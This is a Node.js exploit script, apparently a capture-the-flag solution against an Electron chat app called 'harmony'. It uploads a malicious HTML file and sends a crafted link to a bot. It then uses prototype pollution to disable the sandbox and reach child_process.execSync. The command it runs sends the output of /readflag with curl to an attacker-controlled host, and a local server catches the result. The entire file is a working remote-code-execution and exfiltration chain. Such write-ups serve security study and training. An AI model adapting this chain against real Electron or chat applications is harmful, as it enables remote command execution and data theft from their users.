const express = require('express')
const crypto = require('crypto')
const socketio = require('socket.io-client')
const xf = require('xfetch-js')

if (process.argv.length < 4) {
	console.log('Usage: node index.js <target server> <channel>')
	process.exit(1)
}
const TARGET_SERVER = process.argv[2] // 'https://chal-harmony.chal.hitconctf.com/'
const TARGET_CHANNEL = process.argv[3] // the channel that bot joined
const USERNAME = crypto.randomBytes(8).toString('hex')
const PASSWORD = crypto.randomBytes(8).toString('hex')
const PUBLIC_HOST = 'https://REDACTED/' // ngrok, cf tunnel, etc
const CMD = `curl -k ${new URL('/flag', PUBLIC_HOST).href} -d "flag=$(/readflag)"`

const HOSTED_HTML = `pwned!
<script>
Object.defineProperty(Object.prototype, './lib/renderer/api/ipc-renderer.ts', {
    set(v) {
        console.log('set', v)
        this.module.exports._load('child_process').execSync(${JSON.stringify(CMD)})
    }
})
api.promptResponse('')
</script>`

const sleep = ms => new Promise(r => setTimeout(r, ms))
const app = express()
app.use(express.urlencoded({ extended: false }))
app.get('/', (req, res) => {
	console.log('sent html')
	res.type('html').end(HOSTED_HTML)
})
app.post('/flag', (req, res) => {
	console.log('flag', req.body.flag)
	process.exit(0)
})
app.listen(7777) // needs to map PUBLIC_HOST to localhost:7777 with tools like ngrok

xf.post(`${TARGET_SERVER}/register`, {
	json: {
		username: USERNAME,
		password: PASSWORD
	}
}).then(() => {
	const io = socketio(TARGET_SERVER, {
		auth: {
			username: USERNAME,
			password: PASSWORD
		}
	})
	const PROMPT_REDIRECT = `<meta http-equiv="refresh" content="0;url=${PUBLIC_HOST}">`
	const IFRAME_PAYLOAD = `<script>
	top.api.setChannels('__proto__',{sandbox:false})
	setTimeout(() => {
		top.api.prompt(unescape(${JSON.stringify(escape(PROMPT_REDIRECT))}))
	}, 500)
	</script>`
	io.on('connect', async () => {
		console.log('connected')
		io.emit('joinChannel', { channel: TARGET_CHANNEL })
		io.on('message', msg => {
			console.log('Received', msg)
		})
		io.emit('uploadFile', { filename: 'exp.html', data: Buffer.from(IFRAME_PAYLOAD) })
		const uuid = await new Promise(resolve => io.once('uploadFileResponse', ({ uuid }) => resolve(uuid)))
		console.log('Uploaded', uuid)
		io.emit('sendMessage', {
			channel: TARGET_CHANNEL,
			content: {
				type: 'file',
				uuid,
				filename: 'peko.png'
			}
		})
		await sleep(1000)
		io.emit('sendMessage', {
			channel: TARGET_CHANNEL,
			content: {
				type: 'text',
				text: '<a href="//www.youtube.com.localhost/watch?v=../tmp/harmony/exp.html"></a>'
			}
		})
	})
})
